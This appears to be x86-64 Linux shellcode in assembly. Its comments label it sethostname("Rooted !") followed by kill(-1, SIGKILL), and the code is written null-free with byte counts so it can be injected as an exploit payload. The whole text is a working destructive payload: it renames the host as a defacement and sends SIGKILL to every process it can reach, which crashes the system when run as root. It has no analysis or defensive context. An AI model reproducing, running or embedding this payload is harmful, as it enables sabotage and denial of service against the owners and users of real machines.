

; sethostname("Rooted !");
; kill(-1, SIGKILL);


section .text
    global _start

_start:

    ;-- setHostName("Rooted !"); 22 bytes --;

sethostname:

        xor     rax, rax		; zeroing out rax
        xor     rsi, rsi
        add	    al, 0xaa
        mov	    r9, 0x21206465746F6F52	; Rooted !
        push    r9			
        mov     rdi, rsp		
        add     sil, 0x8		; and subing it down to 0x08
        syscall
        
        ;-- kill(-1, SIGKILL); 11 bytes --;

        xor rax, rax
        add al, 0x3e
        mov rdi, rax
        sub rdi, 0x3f
        inc rsi
        syscall
